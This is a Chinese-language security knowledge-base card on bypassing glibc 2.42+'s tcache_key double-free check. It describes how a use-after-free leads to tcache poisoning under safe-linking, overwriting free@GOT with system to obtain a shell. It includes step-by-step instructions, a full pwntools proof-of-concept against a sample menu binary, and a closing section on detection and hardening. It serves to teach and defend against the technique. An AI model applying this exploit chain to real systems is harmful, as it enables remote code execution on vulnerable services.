---
id: binary-pwn-heap-glibc243-tcache-key-bypass-got-system
title: glibc 2.42+ tcache_key 绕过：UAF 清 key 构造 tcache dup，poisoning 覆写 free@GOT 到 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: tcache-key-bypass-tcache-dup-got-system
tags:
- pwn
- heap
- glibc
- tcache
- tcache-key
- safe-linking
- double-free
- uaf
- got-overwrite
- linux
cve: []
severity: high
confidence: high
affected_versions: glibc 2.42+（tcache_key 引入；原文环境 2.43-4）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V78
  verified_at: '2026-11-05T16:41:03+08:00'
  notes: 已对照原文与13张图核对：glibc 2.43-4 环境（图01）、Partial RELRO/PIE（图02）、tcache 懒初始化与 __tcache_dummy（图03）、tcache_entry next/key 布局与 free 路径 key 检测（图06-08）、double-free abort 134（图10）、exploit 实测 SHELL_OK/GETSHELL SUCCESS（图11）、__free_hook 僵尸符号（图13）、__exit_funcs PTR_MANGLE（图14）均一致；清 key 构造 A→B→A、safe-linking 编码、free@GOT&~0xf 对齐均与原文相同。未验证点：未在本机重跑 exploit；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/heap/binary-pwn-heap-glibc243-tcache-key-bypass-got-system/
draft: false
kb_aliases:
- glibc 2.43 堆利用
- tcache_key 绕过
- double-free 绕过 tcache_key
- tcache dup
- safe-linking tcache poisoning
- free@GOT system
- 无 hook 时代 RCE
---

## 一句话结论

glibc 2.42+ 用随机 `tcache_key` 拦截 double-free、用 safe-linking 编码 tcache 链表，但二者都可被 UAF 写绕过：释放后编辑 chunk，把用户区 `+8` 的 key 清零并保留 `+0` 的 fd 编码，第二次 free 就不再进入 `tcache_double_free_verify`，形成 `A→B→A` dup 链；随后按 safe-linking 编码伪造 next、tcache poisoning 分配到 16 字节对齐的 `free@GOT` 页，覆写为 `system`，再 `free("/bin/sh")` 即可 getshell。

## 原理

- **glibc 2.43 的 tcache 懒初始化**：`tcache` 初始指向 libc BSS 的 `__tcache_dummy`，malloc 不会触发初始化；第一次 free 时才 `tcache_init()` 从 heap 分配 `tcache_perthread_struct`。因此首个 malloc 返回 `heap_base + 0x10`，堆布局更可预测。
- **tcache_entry 布局**：`next` 在用户区 `+0`（safe-linking 编码），`key` 在 `+8`（进程/线程级随机 `tcache_key`）。`tcache_put` 写入 key 并把 `next = PROTECT_PTR(&e->next, 旧链头)`；`tcache_get` 取出时把 `e->key = 0`。
- **double-free 检测点**：free 快速路径中，若 `size < 0x411` 且 `e->key == tcache_key`，进入 `tcache_double_free_verify`：遍历全部 76 个 bin 的链，解码 next 后与待释放 chunk 做物理地址比对，命中即 `malloc_printerr` → abort（退出码 134 = 128+SIGABRT）。若未命中，清零 key 后重试 free。
- **绕过关键**：key 位于用户数据区 `+8`，free 后通过 UAF 仍可写。把 key 改成 0（或任意非 `tcache_key` 值），第二次 free 就不会进入 verify，直接走 `tcache_put` 头插，允许同一 chunk 出现两次，形成 `A → B → A`。
- **safe-linking**：`PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr`，`REVEAL_PTR` 自逆。链尾 chunk 的 `fd = PROTECT_PTR(&A->next, NULL) = A_user >> 12`，由此可泄露 heap 基址；伪造 next 时必须写入 `(A_user >> 12) ^ target`。
- **tcache_get 的唯一校验是 16 字节对齐**（`misaligned_mem`），不检查目标是否为真实 chunk、size 是否合法。因此把伪造的 next 指向 `free@GOT & ~0xf`，下一次 malloc 就返回该地址，随后的 read 直接写到 GOT。
- **无 hook 时代**：2.34 移除 malloc/free hook，`__free_hook` 只剩符号僵尸；2.42+ 对 `__exit_funcs` 使用 PTR_MANGLE（`密文=ROL17(明文^pointer_guard)`，guard 在 TCB+0x30），需要额外泄露。Partial RELRO 的 GOT 覆写仍是成本最低、最稳定的 RCE 路径。

## 触发条件

- 目标为 Linux x64，glibc 2.42+（tcache_key 已引入；原文实测 2.43-4）。
- 存在 UAF：free 后指针未置空，且可对已释放 chunk 执行 edit/read（写用户区）与 show（读用户区）。
- 二进制为 Partial RELRO，GOT 可写；PIE 基址可通过泄露或本地解析获得。
- tcache 对应 bin 未满（默认 16 个槽位），且目标地址 16 字节对齐。
- 有 libc 基址泄露（unsorted bin）与 heap 基址泄露（safe-linking 链尾 fd）。

## 利用步骤

1. 准备 chunk：`add(0,0x18)`、`add(1,0x18)`（同 tcache bin）、`add(2,0x500)`（大 chunk 走 unsorted）、`add(3,0x18)`（隔离，防止大 chunk 与 top 合并）。
2. 泄露 libc：`delete(2)` 后 `show(2)` 读 unsorted bin 的 `fd`，`libc_base = fd - 0x1e7ac8`（2.43-4 的 `main_arena+0x108` 偏移）。
3. 泄露 heap：`delete(0)` 后 `show(0)` 读链尾 fd 编码，`heap_base = fd_leak << 12`，`A_user = heap_base + 0x10`。
4. 构造 dup：`delete(1)` 后链为 `B→A`；`edit(0, p64(A_user>>12) + p64(0))` 保留 A.fd、清零 A.key；`delete(0)` 再次 free，检测失明，链变为 `A→B→A`。
5. 消费 dup：`add(4,0x18)` 取 A、`add(5,0x18)` 取 B，此时 tcache 头又回到 A（仍在链上的重复项）。
6. 伪造 next：`target = free_got & ~0xf`，`edit(4, p64((A_user>>12) ^ target))`。
7. 任意分配：`add(6,0x18)` 取 A，链头变为 target；`add(7,0x18,payload)` 返回 target 并写入 payload。
8. 覆写 GOT：`off = free_got & 0xf`，`payload = b'A'*off + p64(libc.symbols['system'])`，补齐到 0x18；这样 `free@GOT = system`。
9. 触发：用不同 size（如 0x38，避免撞上被污染的 tcache[0]）分配一块内容为 `/bin/sh\0` 的 chunk，`delete` 它；`free("/bin/sh")` 实际调用 `system("/bin/sh")`。
10. 验证 shell：执行 `id`/`echo SHELL_OK`，确认身份与稳定性。

## PoC

```python
from pwn import *
context.arch = 'amd64'

p = process('./vuln')
e = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
e.address = p.libs()['./vuln']          # PIE 本地解析；远程需先泄露 PIE 基址

def add(i, sz, data):
    p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'idx> ', str(i).encode())
    p.sendlineafter(b'size> ', str(sz).encode()); p.sendafter(b'data> ', data)
def delete(i):
    p.sendlineafter(b'> ', b'2'); p.sendlineafter(b'idx> ', str(i).encode())
def edit(i, data):
    p.sendlineafter(b'> ', b'3'); p.sendlineafter(b'idx> ', str(i).encode())
    p.sendafter(b'data> ', data)
def show(i, n):
    p.sendlineafter(b'> ', b'4'); p.sendlineafter(b'idx> ', str(i).encode())
    d = p.recvn(n); p.recvn(1); return d

add(0, 0x18, b'A'*0x18)      # A
add(1, 0x18, b'B'*0x18)      # B
add(2, 0x500, b'C'*0x100)    # C -> unsorted
add(3, 0x18, b'D'*0x18)      # D 隔离

delete(2)
libc.address = u64(show(2, 0x500)[:8]) - 0x1e7ac8
delete(0)
heap_base = u64(show(0, 0x18)[:8]) << 12
A_user = heap_base + 0x10

delete(1)                                   # tcache: B -> A
edit(0, p64(A_user >> 12) + p64(0))         # 保留 fd，清 key
delete(0)                                   # tcache: A -> B -> A

add(4, 0x18, b'P'*0x18)                     # 取 A
add(5, 0x18, b'Q'*0x18)                     # 取 B，头回到 A

free_got = e.got['free']
target   = free_got & ~0xf
off      = free_got & 0xf
edit(4, p64((A_user >> 12) ^ target))       # A.next = PROTECT_PTR(A, target)
add(6, 0x18, b'R'*0x18)                     # 取 A，头 -> target
payload = (b'A'*off + p64(libc.symbols['system'])).ljust(0x18, b'B')
add(7, 0x18, payload)                       # 分配到 target，写 free@GOT

add(8, 0x38, b'/bin/sh\x00' + b'C'*0x30)    # 不同 size，走 top
delete(8)                                   # free("/bin/sh") -> system("/bin/sh")
p.interactive()
```

```text
# 原文在 Kali glibc 2.43-4 实测输出：SHELL_OK + id，退出正常；
# 本卡未复跑，PoC 为按原文 exploit_full.py 的精简复现。
```

## 变体与关联

- 变体：glibc < 2.42 没有 tcache_key，普通 double-free 即可形成 dup，无需清 key；2.32 以前没有 safe-linking，fd 直接写目标地址。
- 变体：目标不是 `free@GOT` 时，可写 `malloc@GOT`、`exit@GOT`、`__stack_chk_fail@GOT` 等；Full RELRO 下 GOT 不可写，需转向 `__exit_funcs`/FSOP/`_rtld_global`。
- 变体：2.42+ 的 `__exit_funcs` 受 PTR_MANGLE 保护（`密文=ROL17(明文^pointer_guard)`，guard 在 TCB+0x30）；若能泄露 pointer_guard 或一对明文/密文，可伪造 `system` 密文走 exit 路径，但成本高于本链。
- 变体：tcache_key 本身可通过同线程 UAF 读 `+8` 获得；若目标允许，也可覆盖 key 为任意非当前值而不只是 0。
- 关联：[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（libc 泄露）、[[binary-pwn-heap-safe-linking-self-xor-heap-address]]（safe-linking 堆地址恢复）、[[binary-pwn-heap-house-of-apple-2-stderr-fsop]]（Full RELRO/hook 移除后的 FSOP 备选）。
- 边界：无 UAF 写、key 不可达、tcache bin 已满、目标未 16 字节对齐、Full RELRO、或 glibc 后续版本进一步校验 tcache 链表真实性时，本链失效。

## 检测与防御

- 检测：free 后对同一 chunk 的再次写入/释放；`free(): double free detected in tcache 2`、`unaligned tcache chunk`、`corrupted size` 等 glibc 报错；进程异常 abort（退出码 134）；tcache 链中出现重复物理地址或指向非堆地址。
- 修复：free 后立即把指针置 NULL；edit 的写入长度与 chunk size 强绑定；使用安全的菜单状态机，禁止对已释放对象操作。
- 加固：编译时启用 Full RELRO（`-z now -z relro`）关闭 GOT 覆写；启用 canary、FORTIFY、PIE；运行时启用 ASan/Valgrind/MALLOC_CHECK_ 做堆完整性监控。
- 系统：及时更新 glibc（2.42+ 的 tcache_key/PTR_MANGLE 已提高利用成本）；对暴露服务启用 seccomp/沙箱，降低任意写后的 RCE 影响。
